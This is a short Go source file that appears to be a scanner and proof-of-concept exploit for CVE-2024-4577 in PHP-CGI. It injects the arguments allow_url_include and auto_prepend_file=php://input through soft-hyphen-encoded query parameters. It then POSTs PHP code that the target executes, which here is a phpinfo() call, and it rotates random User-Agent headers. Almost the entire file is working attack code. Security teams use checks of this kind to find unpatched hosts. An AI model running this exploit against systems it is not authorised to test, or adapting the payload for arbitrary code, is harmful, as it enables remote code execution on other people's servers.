package exploit

import (
    "fmt"

	"github.com/corpix/uarand"
    "github.com/zomasec/CVE-2024-4577/config"
    "github.com/zomasec/CVE-2024-4577/pkg/client"
    "github.com/zomasec/CVE-2024-4577/pkg/utils"
)


var cfg = config.Init()

// CheckExploit checks if the given host is vulnerable
func CheckExploit(domain string, timeout int) {
	path := "/test.hello?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
	data := "<?php phpinfo(); ?>"
	headers := map[string]string{
		"User-Agent":     uarand.GetRandom(),
		"Accept":         "*/*",
		"Content-Length": "23",
		"Content-Type":   "application/x-www-form-urlencoded",
		"Connection":     "keep-alive",
	}

	response, err := client.MakeRequest(fmt.Sprintf("%s%s", domain, path) , "POST", data, headers, timeout)
	if err != nil {
		fmt.Printf("Error checking domain %s: %v\n", domain, err)
		return
	}

	if utils.ContainsPHPVersion(response) {
		fmt.Printf("%s: Vulnerable\n", domain)
        cfg.Logger.INFO("Vulnerable")
	} else {
		fmt.Printf("%s: Not Vulnerable\n", domain)
	}
}
